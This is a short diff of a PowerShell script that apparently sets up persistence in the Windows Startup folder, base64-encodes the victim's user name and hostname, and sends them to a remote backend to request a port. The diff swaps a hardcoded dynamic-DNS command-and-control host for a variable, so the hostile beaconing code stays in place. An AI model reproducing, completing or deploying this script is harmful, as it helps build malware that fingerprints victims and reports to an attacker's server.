@@ -49,7 +49,7 @@ $batFilePath = "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\
 $data = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$user`:$username`:$hostname"))
 
 # Request port to backend
-$domain_name = "edcoretecmm.sytes.net:50000"
+$domain_name = "$remote_host"
 $response = Invoke-RestMethod -Uri "https://$domain_name/report?data=$data" -UseBasicParsing
 
 # Clean response (remove any percent signs)
